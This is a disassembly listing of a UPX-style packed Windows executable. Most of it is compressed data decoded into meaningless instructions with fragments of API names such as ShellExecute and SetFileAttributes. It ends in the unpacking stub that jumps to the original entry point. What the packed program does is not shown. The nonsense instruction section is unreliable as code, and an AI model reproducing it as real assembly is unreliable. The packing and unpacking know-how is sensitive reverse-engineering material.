  410b6d:	d5 30                	aad    $0x30
  410b6f:	4e                   	dec    %esi
  410b70:	61                   	popa
  410b71:	6d                   	insl   (%dx),%es:(%edi)
  410b72:	d7                   	xlat   %ds:(%ebx)
  410b73:	ee                   	out    %al,(%dx)
  410b74:	93                   	xchg   %eax,%ebx
  410b75:	05 73 55 b1 c4       	add    $0xc4b15573,%eax
  410b7a:	44                   	inc    %esp
  410b7b:	75 70                	jne    0x410bed
  410b7d:	6c                   	insb   (%dx),%es:(%edi)
  410b7e:	37                   	aaa
  410b7f:	70 e7                	jo     0x410b68
  410b81:	1e                   	push   %ds
  410b82:	b2 74                	mov    $0x74,%dl
  410b84:	86 50 69             	xchg   %dl,0x69(%eax)
  410b87:	70 78                	jo     0x410c01
  410b89:	2f                   	das
  410b8a:	53                   	push   %ebx
  410b8b:	74 64                	je     0x410bf1
  410b8d:	ef                   	out    %eax,(%dx)
  410b8e:	82 0d 9b 16 a0 39 a3 	orb    $0xa3,0x39a0169b
  410b95:	57                   	push   %edi
  410b96:	61                   	popa
  410b97:	69 74 7b 06 f7 ff 46 	imul   $0x6f46fff7,0x6(%ebx,%edi,2),%esi
  410b9e:	6f 
  410b9f:	72 53                	jb     0x410bf4
  410ba1:	69 6e 67 6c 65 4f 62 	imul   $0x624f656c,0x67(%esi),%ebp
  410ba8:	6a 79                	push   $0x79
  410baa:	21 98 8c 73 29 fb    	and    %ebx,-0x4d68c74(%eax)
  410bb0:	29 4c 65 61          	sub    %ecx,0x61(%ebp,%eiz,2)
  410bb4:	76 65                	jbe    0x410c1b
  410bb6:	15 5e 8e ef 3f       	adc    $0x3fef8e5e,%eax
  410bbb:	08 0b                	or     %cl,(%ebx)
  410bbd:	41                   	inc    %ecx
  410bbe:	44                   	inc    %esp
  410bbf:	72 69                	jb     0x410c2a
  410bc1:	76 65                	jbe    0x410c28
  410bc3:	54                   	push   %esp
  410bc4:	79 70                	jns    0x410c36
  410bc6:	b2 e1                	mov    $0xe1,%dl
  410bc8:	b9 d8 ee 46 69       	mov    $0x6946eed8,%ecx
  410bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  410bce:	fb                   	sti
  410bcf:	72 73                	jb     0x410c44
  410bd1:	f7 74 0f 36          	divl   0x36(%edi,%ecx,1)
  410bd5:	f7 ff                	idiv   %edi
  410bd7:	8b 10                	mov    (%eax),%edx
  410bd9:	6b db 41             	imul   $0x41,%ebx,%ebx
  410bdc:	74 74                	je     0x410c52
  410bde:	72 69                	jb     0x410c49
  410be0:	62 75 74             	bound  %esi,0x74(%ebp)
  410be3:	65 73 1e             	gs jae 0x410c04
  410be6:	9d                   	popf
  410be7:	bb fb 04 b5 44       	mov    $0x44b504fb,%ebx
  410bec:	69 72 8c 6f 72 79 11 	imul   $0x1179726f,-0x74(%edx),%esi
  410bf3:	64 4c                	fs dec %esp
  410bf5:	86 fd                	xchg   %bh,%ch
  410bf7:	19 fe                	sbb    %edi,%esi
  410bf9:	61                   	popa
  410bfa:	73 74                	jae    0x410c70
  410bfc:	45                   	inc    %ebp
  410bfd:	72 72                	jb     0x410c71
  410bff:	6f                   	outsl  %ds:(%esi),(%dx)
  410c00:	30 3e                	xor    %bh,(%esi)
  410c02:	4e                   	dec    %esi
  410c03:	65 78 4d             	gs js  0x410c53
  410c06:	7c 48                	jl     0x410c50
  410c08:	58                   	pop    %eax
  410c09:	10 4f 42             	adc    %cl,0x42(%edi)
  410c0c:	fc                   	cld
  410c0d:	52                   	push   %edx
  410c0e:	65 3f                	gs aas
  410c10:	9c                   	pushf
  410c11:	8e 27                	mov    (%edi),%fs
  410c13:	b6 00                	mov    $0x0,%dh
  410c15:	c8 24 b8 69          	enter  $0xb824,$0x69
  410c19:	43                   	inc    %ebx
  410c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  410c1b:	6d                   	insl   (%dx),%es:(%edi)
  410c1c:	8e dd                	mov    %ebp,%ds
  410c1e:	77 fc                	ja     0x410c1c
  410c20:	6d                   	insl   (%dx),%es:(%edi)
  410c21:	6f                   	outsl  %ds:(%esi),(%dx)
  410c22:	6e                   	outsb  %ds:(%esi),(%dx)
  410c23:	43                   	inc    %ebx
  410c24:	6f                   	outsl  %ds:(%esi),(%dx)
  410c25:	6e                   	outsb  %ds:(%esi),(%dx)
  410c26:	0c 6c                	or     $0x6c,%al
  410c28:	73 00                	jae    0x410c2a
  410c2a:	00 e2                	add    %ah,%dl
  410c2c:	1c fc                	sbb    $0xfc,%al
  410c2e:	41                   	inc    %ecx
  410c2f:	41                   	inc    %ecx
  410c30:	a3 63 67 f8 6d       	mov    %eax,0x6df86763
  410c35:	65 6d                	gs insl (%dx),%es:(%edi)
  410c37:	73 65                	jae    0x410c9e
  410c39:	ef                   	out    %eax,(%dx)
  410c3a:	07                   	pop    %es
  410c3b:	63 70 26             	arpl   %esi,0x26(%eax)
  410c3e:	5f                   	pop    %edi
  410c3f:	2e ec                	cs in  (%dx),%al
  410c41:	8b 74 bf 69          	mov    0x69(%edi,%edi,4),%esi
  410c45:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  410c48:	00 01                	add    %al,(%ecx)
  410c4a:	08 6e 12             	or     %ch,0x12(%esi)
  410c4d:	6e                   	outsb  %ds:(%esi),(%dx)
  410c4e:	13 9d e1 2e 96 12    	adc    0x12962ee1(%ebp),%ebx
  410c54:	2d 6d 6f 76 66       	sub    $0x66766f6d,%eax
  410c59:	24 6c                	and    $0x6c,%al
  410c5b:	e7 76                	out    %eax,$0x76
  410c5d:	b1 d8                	mov    $0xd8,%cl
  410c5f:	65 6e                	outsb  %gs:(%esi),(%dx)
  410c61:	2c 3e                	sub    $0x3e,%al
  410c63:	0f 63 61 4e          	packsswb 0x4e(%ecx),%mm4
  410c67:	07                   	pop    %es
  410c68:	e1 fd                	loope  0x410c67
  410c6a:	ba 5f 6e 10 00       	mov    $0x106e5f,%edx
  410c6f:	ed                   	in     (%dx),%eax
  410c70:	68 e8 85 43 6f       	push   $0x6f4385e8
  410c75:	87 f1                	xchg   %esi,%ecx
  410c77:	e1 ff                	loope  0x410c78
  410c79:	e9 3e 00 00 f7       	jmp    0xf7410cbc
  410c7e:	16                   	push   %ss
  410c7f:	e0 53                	loopne 0x410cd4
  410c81:	68 65 6c 6c 45       	push   $0x456c6c65
  410c86:	78 65                	js     0x410ced
  410c88:	63 05 df f1 7d b7    	arpl   %eax,0xb77df1df
  410c8e:	45                   	inc    %ebp
  410c8f:	78 91                	js     0x410c22
  410c91:	03 01                	add    (%ecx),%eax
  410c93:	00 00                	add    %al,(%eax)
  410c95:	c0 19 4d             	rcrb   $0x4d,(%ecx)
  410c98:	a9 61 67 65 42       	test   $0x42656761,%eax
  410c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  410c9e:	66 6c                	data16 insb (%dx),%es:(%edi)
  410ca0:	f8                   	clc
  410ca1:	70 15                	jo     0x410cb8
  410ca3:	12 57 4e             	adc    0x4e(%edi),%dl
  410ca6:	6f                   	outsl  %ds:(%esi),(%dx)
  410ca7:	77 af                	ja     0x410c58
  410ca9:	ff                   	ljmp   (bad)
  410caa:	ec                   	in     (%dx),%al
  410cab:	43                   	inc    %ebx
  410cac:	10 c9                	adc    %cl,%cl
  410cae:	74 49                	je     0x410cf9
  410cb0:	73 18                	jae    0x410cca
  410cb2:	56                   	push   %esi
  410cb3:	69 73 69 62 6c 66 b8 	imul   $0xb8666c62,0x69(%ebx),%esi
  410cba:	0f 73                	psrlq  $0x73,(bad)
  410cbc:	92                   	xchg   %eax,%edx
  410cbd:	10 45 6e             	adc    %al,0x6e(%ebp)
  410cc0:	61                   	popa
  410cc1:	0f d8 0e             	psubusb (%esi),%mm1
  410cc4:	b3 8e                	mov    $0x8e,%bl
  410cc6:	1b eb                	sbb    %ebx,%ebp
  410cc8:	65 67 72 d9          	gs addr16 jb 0x410ca5
  410ccc:	64 2c ec             	fs sub $0xec,%al
  410ccf:	33 cc                	xor    %esp,%ecx
  410cd1:	5e                   	pop    %esi
  410cd2:	f6 1d 0d 75 6d 0b    	negb   0xb6d750d
  410cd8:	1b 9a ff f7 fe bf    	sbb    -0x40010801(%edx),%ebx
  410cde:	00 50 45             	add    %dl,0x45(%eax)
  410ce1:	00 00                	add    %al,(%eax)
  410ce3:	4c                   	dec    %esp
  410ce4:	01 06                	add    %eax,(%esi)
  410ce6:	00 17                	add    %dl,(%edi)
  410ce8:	63 98 4d 0f 03 e0    	arpl   %ebx,-0x1ffcf0b3(%eax)
  410cee:	00 0f                	add    %cl,(%edi)
  410cf0:	01 0b                	add    %ecx,(%ebx)
  410cf2:	01 02                	add    %eax,(%edx)
  410cf4:	b8 d7 14 c5 32       	mov    $0x32c514d7,%eax
  410cf9:	00 6e 0e             	add    %ch,0xe(%esi)
  410cfc:	11 03                	adc    %eax,(%ebx)
  410cfe:	ae                   	scas   %es:(%edi),%al
  410cff:	fb                   	sti
  410d00:	4c                   	dec    %esp
  410d01:	41                   	inc    %ecx
  410d02:	11 03                	adc    %eax,(%ebx)
  410d04:	40                   	inc    %eax
  410d05:	0b 00                	or     (%eax),%eax
  410d07:	04 3d                	add    $0x3d,%al
  410d09:	cc                   	int3
  410d0a:	bd 7f 0b 02 00       	mov    $0x20b7f,%ebp
  410d0f:	00 04 0e             	add    %al,(%esi,%ecx,1)
  410d12:	03 07                	add    (%edi),%eax
  410d14:	00 f0                	add    %dh,%al
  410d16:	d0 39                	sarb   $1,(%ecx)
  410d18:	e7 96                	out    %eax,$0x96
  410d1a:	0c 1e                	or     $0x1e,%al
  410d1c:	0c 28                	or     $0x28,%al
  410d1e:	02 00                	add    (%eax),%al
  410d20:	2e 16                	cs push %ss
  410d22:	33 01                	xor    (%ecx),%eax
  410d24:	5a                   	pop    %edx
  410d25:	07                   	pop    %es
  410d26:	09 17                	or     %edx,(%edi)
  410d28:	37                   	aaa
  410d29:	fb                   	sti
  410d2a:	f7 67 02             	mull   0x2(%edi)
  410d2d:	7c 50                	jl     0x410d7f
  410d2f:	00 00                	add    %al,(%eax)
  410d31:	8c 0a                	mov    %cs,(%edx)
  410d33:	60                   	pusha
  410d34:	00 00                	add    %al,(%eax)
  410d36:	bc 30 0d 20 fb       	mov    $0xfb200d30,%esp
  410d3b:	a9 b2 03 fc 51       	test   $0x51fc03b2,%eax
  410d40:	00 00                	add    %al,(%eax)
  410d42:	f4                   	hlt
  410d43:	45                   	inc    %ebp
  410d44:	44                   	inc    %esp
  410d45:	cf                   	iret
  410d46:	ed                   	in     (%dx),%eax
  410d47:	7e 2e                	jle    0x410d77
  410d49:	63 6f 64             	arpl   %ebp,0x64(%edi)
  410d4c:	65 1f                	gs pop %ds
  410d4e:	31 07                	xor    %eax,(%edi)
  410d50:	04 97                	add    $0x97,%al
  410d52:	ef                   	out    %eax,(%dx)
  410d53:	5c                   	pop    %esp
  410d54:	32 03                	xor    (%ebx),%al
  410d56:	1a c4                	sbb    %ah,%al
  410d58:	13 02                	adc    (%edx),%eax
  410d5a:	20 00                	and    %al,(%eax)
  410d5c:	00 60 a0             	add    %ah,-0x60(%eax)
  410d5f:	73 3b                	jae    0x410d9c
  410d61:	c7                   	(bad)
  410d62:	2e 74 89             	je,pn  0x410cee
  410d65:	0b 98 19 04 10 00    	or     0x100419(%eax),%ebx
  410d6b:	2e 60                	cs pusha
  410d6d:	ae                   	scas   %es:(%edi),%al
  410d6e:	21 65 0c             	and    %esp,0xc(%ebp)
  410d71:	0b 02                	or     (%edx),%eax
  410d73:	16                   	push   %ss
  410d74:	fb                   	sti
  410d75:	1a de                	sbb    %dh,%bl
  410d77:	ff 60 2e             	jmp    *0x2e(%eax)
  410d7a:	72 64                	jb     0x410de0
  410d7c:	61                   	popa
  410d7d:	74 61                	je     0x410de0
  410d7f:	00 00                	add    %al,(%eax)
  410d81:	1c 17                	sbb    $0x17,%al
  410d83:	1e                   	push   %ds
  410d84:	00 cb                	add    %cl,%bl
  410d86:	26 0c ef             	es or  $0xef,%al
  410d89:	d9 6e d9             	fldcw  -0x27(%esi)
  410d8c:	03 16                	add    (%esi),%edx
  410d8e:	40                   	inc    %eax
  410d8f:	2e 26 00 a8 77 dd 5b 	cs add %ch,%es:-0x9a42289(%eax)
  410d96:	f6 
  410d97:	75 fb                	jne    0x410d94
  410d99:	00 77 28             	add    %dh,0x28(%edi)
  410d9c:	23 09                	and    (%ecx),%ecx
  410d9e:	27                   	daa
  410d9f:	c0 82 21 82 fb 2e 72 	rolb   $0x72,0x2efb8221(%edx)
  410da6:	73 72                	jae    0x410e1a
  410da8:	63 0c 13             	arpl   %ecx,(%ebx,%edx,1)
  410dab:	1b 68 7e             	sbb    0x7e(%eax),%ebp
  410dae:	17                   	pop    %ss
  410daf:	30 37                	xor    %dh,(%edi)
  410db1:	30 10                	xor    %dl,(%eax)
  410db3:	02 27                	add    (%edi),%ah
  410db5:	40                   	inc    %eax
  410db6:	2e 78 4f             	js,pn  0x410e08
  410db9:	62 66 ae             	bound  %esp,-0x52(%esi)
  410dbc:	a1 c2 ed 13 16       	mov    0x1613edc2,%eax
  410dc1:	78 04                	js     0x410dc7
  410dc3:	f6 7a 07             	idivb  0x7(%edx)
  410dc6:	ff                   	(bad)
  410dc7:	ff 85 b9 34 03 02    	incl   0x20334b9(%ebp)
  410dcd:	e0 00                	loopne 0x410dcf
  410dcf:	e0 00                	loopne 0x410dd1
  410dd1:	00 00                	add    %al,(%eax)
  410dd3:	00 00                	add    %al,(%eax)
  410dd5:	00 00                	add    %al,(%eax)
  410dd7:	00 62 e3             	add    %ah,-0x1d(%edx)
  410dda:	00 00                	add    %al,(%eax)
  410ddc:	00 00                	add    %al,(%eax)
  410dde:	00 00                	add    %al,(%eax)
  410de0:	00 80 04 00 ff 00    	add    %al,0xff0004(%eax)
	...
  410dee:	00 00                	add    %al,(%eax)
  410df0:	60                   	pusha
  410df1:	be 15 b0 40 00       	mov    $0x40b015,%esi
  410df6:	8d be eb 5f ff ff    	lea    -0xa015(%esi),%edi
  410dfc:	57                   	push   %edi
  410dfd:	83 cd ff             	or     $0xffffffff,%ebp
  410e00:	eb 10                	jmp    0x410e12
  410e02:	90                   	nop
  410e03:	90                   	nop
  410e04:	90                   	nop
  410e05:	90                   	nop
  410e06:	90                   	nop
  410e07:	90                   	nop
  410e08:	8a 06                	mov    (%esi),%al
  410e0a:	46                   	inc    %esi
  410e0b:	88 07                	mov    %al,(%edi)
  410e0d:	47                   	inc    %edi
  410e0e:	01 db                	add    %ebx,%ebx
  410e10:	75 07                	jne    0x410e19
  410e12:	8b 1e                	mov    (%esi),%ebx
  410e14:	83 ee fc             	sub    $0xfffffffc,%esi
  410e17:	11 db                	adc    %ebx,%ebx
  410e19:	72 ed                	jb     0x410e08
  410e1b:	b8 01 00 00 00       	mov    $0x1,%eax
  410e20:	01 db                	add    %ebx,%ebx
  410e22:	75 07                	jne    0x410e2b
  410e24:	8b 1e                	mov    (%esi),%ebx
  410e26:	83 ee fc             	sub    $0xfffffffc,%esi
  410e29:	11 db                	adc    %ebx,%ebx
  410e2b:	11 c0                	adc    %eax,%eax
  410e2d:	01 db                	add    %ebx,%ebx
  410e2f:	73 ef                	jae    0x410e20
  410e31:	75 09                	jne    0x410e3c
  410e33:	8b 1e                	mov    (%esi),%ebx
  410e35:	83 ee fc             	sub    $0xfffffffc,%esi
  410e38:	11 db                	adc    %ebx,%ebx
  410e3a:	73 e4                	jae    0x410e20
  410e3c:	31 c9                	xor    %ecx,%ecx
  410e3e:	83 e8 03             	sub    $0x3,%eax
  410e41:	72 0d                	jb     0x410e50
  410e43:	c1 e0 08             	shl    $0x8,%eax
  410e46:	8a 06                	mov    (%esi),%al
  410e48:	46                   	inc    %esi
  410e49:	83 f0 ff             	xor    $0xffffffff,%eax
  410e4c:	74 74                	je     0x410ec2
  410e4e:	89 c5                	mov    %eax,%ebp
  410e50:	01 db                	add    %ebx,%ebx
  410e52:	75 07                	jne    0x410e5b
  410e54:	8b 1e                	mov    (%esi),%ebx
  410e56:	83 ee fc             	sub    $0xfffffffc,%esi
  410e59:	11 db                	adc    %ebx,%ebx
  410e5b:	11 c9                	adc    %ecx,%ecx
  410e5d:	01 db                	add    %ebx,%ebx
  410e5f:	75 07                	jne    0x410e68
  410e61:	8b 1e                	mov    (%esi),%ebx
  410e63:	83 ee fc             	sub    $0xfffffffc,%esi
  410e66:	11 db                	adc    %ebx,%ebx
  410e68:	11 c9                	adc    %ecx,%ecx
  410e6a:	75 20                	jne    0x410e8c
  410e6c:	41                   	inc    %ecx
  410e6d:	01 db                	add    %ebx,%ebx
  410e6f:	75 07                	jne    0x410e78
  410e71:	8b 1e                	mov    (%esi),%ebx
  410e73:	83 ee fc             	sub    $0xfffffffc,%esi
  410e76:	11 db                	adc    %ebx,%ebx
  410e78:	11 c9                	adc    %ecx,%ecx
  410e7a:	01 db                	add    %ebx,%ebx
  410e7c:	73 ef                	jae    0x410e6d
  410e7e:	75 09                	jne    0x410e89
  410e80:	8b 1e                	mov    (%esi),%ebx
  410e82:	83 ee fc             	sub    $0xfffffffc,%esi
  410e85:	11 db                	adc    %ebx,%ebx
  410e87:	73 e4                	jae    0x410e6d
  410e89:	83 c1 02             	add    $0x2,%ecx
  410e8c:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  410e92:	83 d1 01             	adc    $0x1,%ecx
  410e95:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  410e98:	83 fd fc             	cmp    $0xfffffffc,%ebp
  410e9b:	76 0f                	jbe    0x410eac
  410e9d:	8a 02                	mov    (%edx),%al
  410e9f:	42                   	inc    %edx
  410ea0:	88 07                	mov    %al,(%edi)
  410ea2:	47                   	inc    %edi
  410ea3:	49                   	dec    %ecx
  410ea4:	75 f7                	jne    0x410e9d
  410ea6:	e9 63 ff ff ff       	jmp    0x410e0e
  410eab:	90                   	nop
  410eac:	8b 02                	mov    (%edx),%eax
  410eae:	83 c2 04             	add    $0x4,%edx
  410eb1:	89 07                	mov    %eax,(%edi)
  410eb3:	83 c7 04             	add    $0x4,%edi
  410eb6:	83 e9 04             	sub    $0x4,%ecx
  410eb9:	77 f1                	ja     0x410eac
  410ebb:	01 cf                	add    %ecx,%edi
  410ebd:	e9 4c ff ff ff       	jmp    0x410e0e
  410ec2:	5e                   	pop    %esi
  410ec3:	89 f7                	mov    %esi,%edi
  410ec5:	b9 07 00 00 00       	mov    $0x7,%ecx
  410eca:	8a 07                	mov    (%edi),%al
  410ecc:	47                   	inc    %edi
  410ecd:	2c e8                	sub    $0xe8,%al
  410ecf:	3c 01                	cmp    $0x1,%al
  410ed1:	77 f7                	ja     0x410eca
  410ed3:	80 3f 03             	cmpb   $0x3,(%edi)
  410ed6:	75 f2                	jne    0x410eca
  410ed8:	8b 07                	mov    (%edi),%eax
  410eda:	8a 5f 04             	mov    0x4(%edi),%bl
  410edd:	66 c1 e8 08          	shr    $0x8,%ax
  410ee1:	c1 c0 10             	rol    $0x10,%eax
  410ee4:	86 c4                	xchg   %al,%ah
  410ee6:	29 f8                	sub    %edi,%eax
  410ee8:	80 eb e8             	sub    $0xe8,%bl
  410eeb:	01 f0                	add    %esi,%eax
  410eed:	89 07                	mov    %eax,(%edi)
  410eef:	83 c7 05             	add    $0x5,%edi
  410ef2:	88 d8                	mov    %bl,%al
  410ef4:	e2 d9                	loop   0x410ecf
  410ef6:	8d be 00 e0 00 00    	lea    0xe000(%esi),%edi
  410efc:	8b 07                	mov    (%edi),%eax
  410efe:	09 c0                	or     %eax,%eax
  410f00:	74 3c                	je     0x410f3e
  410f02:	8b 5f 04             	mov    0x4(%edi),%ebx
  410f05:	8d 84 30 c0 02 01 00 	lea    0x102c0(%eax,%esi,1),%eax
  410f0c:	01 f3                	add    %esi,%ebx
  410f0e:	50                   	push   %eax
  410f0f:	83 c7 08             	add    $0x8,%edi
  410f12:	ff 96 54 03 01 00    	call   *0x10354(%esi)
  410f18:	95                   	xchg   %eax,%ebp
  410f19:	8a 07                	mov    (%edi),%al
  410f1b:	47                   	inc    %edi
  410f1c:	08 c0                	or     %al,%al
  410f1e:	74 dc                	je     0x410efc
  410f20:	89 f9                	mov    %edi,%ecx
  410f22:	57                   	push   %edi
  410f23:	48                   	dec    %eax
  410f24:	f2 ae                	repnz scas %es:(%edi),%al
  410f26:	55                   	push   %ebp
  410f27:	ff 96 5c 03 01 00    	call   *0x1035c(%esi)
  410f2d:	09 c0                	or     %eax,%eax
  410f2f:	74 07                	je     0x410f38
  410f31:	89 03                	mov    %eax,(%ebx)
  410f33:	83 c3 04             	add    $0x4,%ebx
  410f36:	eb e1                	jmp    0x410f19
  410f38:	ff 96 58 03 01 00    	call   *0x10358(%esi)
  410f3e:	8b ae 60 03 01 00    	mov    0x10360(%esi),%ebp
  410f44:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  410f4a:	bb 00 10 00 00       	mov    $0x1000,%ebx
  410f4f:	50                   	push   %eax
  410f50:	54                   	push   %esp
  410f51:	6a 04                	push   $0x4
  410f53:	53                   	push   %ebx
  410f54:	57                   	push   %edi
  410f55:	ff d5                	call   *%ebp
  410f57:	8d 87 9f 01 00 00    	lea    0x19f(%edi),%eax
  410f5d:	80 20 7f             	andb   $0x7f,(%eax)
  410f60:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  410f64:	58                   	pop    %eax
  410f65:	50                   	push   %eax
  410f66:	54                   	push   %esp
  410f67:	50                   	push   %eax
  410f68:	53                   	push   %ebx
  410f69:	57                   	push   %edi
  410f6a:	ff d5                	call   *%ebp
  410f6c:	58                   	pop    %eax
  410f6d:	61                   	popa
  410f6e:	8d 44 24 80          	lea    -0x80(%esp),%eax
  410f72:	6a 00                	push   $0x0
  410f74:	39 c4                	cmp    %eax,%esp
  410f76:	75 fa                	jne    0x410f72
  410f78:	83 ec 80             	sub    $0xffffff80,%esp
  410f7b:	e9 80 00 ff ff       	jmp    0x401000
	...
